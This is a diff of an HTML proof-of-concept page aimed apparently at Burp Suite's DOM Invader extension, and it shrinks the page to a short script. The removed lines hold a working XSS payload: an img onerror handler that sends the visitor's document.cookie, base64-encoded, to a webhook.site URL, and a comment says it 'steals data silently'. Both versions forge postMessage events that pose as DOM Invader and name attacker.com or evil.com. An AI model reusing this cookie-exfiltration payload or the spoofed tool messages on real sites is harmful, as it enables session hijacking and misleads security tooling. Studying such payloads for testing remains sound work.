@@ -1,55 +1,23 @@
+<script>
+const webhook = "https://webhook.site/d7b0c1e7-9c88-415f-bc83-f4b67cc847cd";
 
-<!DOCTYPE html>
-<html>
-<head>
-    <title>DOM Invader - Professional Final PoC</title>
-    <style>
-        body { background: #111; color: #0f0; font-family: sans-serif; text-align: center; padding-top: 100px; }
-        .input-box { padding: 10px; font-size: 18px; border-radius: 5px; border: 1px solid #0f0; background: #000; color: #0f0; margin-bottom: 20px; }
-        .btn { padding: 15px 30px; background: #0f0; color: #000; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; }
-    </style>
-</head>
-<body>
-    <h1>[ DOM INVADER SECURITY AUDIT ]</h1>
-    <p>Type <b>'run'</b> and click the button to trigger detection.</p>
-    
-    <input type="text" id="secret" class="input-box" placeholder="Enter password...">
-    <br>
-    <button class="btn" onclick="checkAndRun()">TRIGGER VULNERABILITY</button>
-    
-    <div id="status" style="margin-top: 20px; color: #888;">Waiting for action...</div>
-    <div id="target" style="display:none"></div>
+function checkAndRun() {
+    const val = document.getElementById('secret').value;
+    if (val !== 'run') return;
 
-    <script>
-        const canary = "uitdeeq";
-        const webhook = "https://webhook.site/d7b0c1e7-9c88-415f-bc83-f4b67cc847cd";
+    document.getElementById('status').innerText =
+        "Payload sent. Now check DOM Invader.";
 
-        function checkAndRun() {
-            const val = document.getElementById('secret').value;
-            if (val !== 'run') {
-                alert("Incorrect password!");
-                return;
-            }
+    const payload = "TEST_PAYLOAD_" + Math.random();
 
-            document.getElementById('status').innerText = "Detection Triggered! Now check DOM Invader.";
-            
-            // Professional Payload: Steals data silently and then alerts
-            const payload = "'); <img src=x onerror=\"fetch('" + webhook + "?c=' + btoa(document.cookie), {mode:'no-cors'}); alert('RCE SUCCESS: Data Exfiltrated to Webhook!');\"> // " + canary;
-
-            // Trigger the Sink in DOM Invader
-            document.getElementById('target').innerHTML = payload;
-
-            // Send the IPC Message
-            window.postMessage({
-                "source": "dom-invader",
-                "type": "augmented-dom",
-                "data": {
-                    "sink": "innerHTML",
-                    "value": payload,
-                    "stackTrace": "at research_expert (http://attacker.com)"
-                }
-            }, "*");
+    window.postMessage({
+        source: "dom-invader",
+        type: "augmented-dom",
+        data: {
+            sink: "innerHTML",
+            value: payload,
+            stackTrace: "at attacker (http://evil.com)"
         }
-    </script>
-</body>
-</html>
+    }, "*");
+}
+</script>
